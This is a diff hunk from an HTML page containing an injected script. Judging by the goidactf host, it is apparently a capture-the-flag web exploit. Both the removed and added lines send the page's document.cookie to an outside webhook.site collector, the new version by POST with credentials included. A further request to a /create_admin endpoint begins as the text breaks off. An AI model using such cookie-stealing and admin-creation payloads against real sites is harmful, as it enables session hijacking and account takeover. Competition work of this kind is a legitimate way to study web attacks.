@@ -11,7 +11,16 @@
                     </form>
 
                    <script>
-                    fetch('https://webhook.site/81a20f93-8670-419e-a8b4-e61bba21b005?q='+document.cookie).then(r=>r.text()).then(d=>console.log(d))
+                    fetch('https://webhook.site/81a20f93-8670-419e-a8b4-e61bba21b005?q=',
+                        {
+                        method:'POST',
+                        credentials:'include',
+                        headers:{
+                            'Content-Type':'application/x-www-form-urlencoded'  
+                        },
+                        body:document.cookie
+                        }
+                    ).then(r=>r.text()).then(d=>console.log(d))
                     
                    fetch('https://tasks.goidactf.ru:20030/create_admin',
                    {
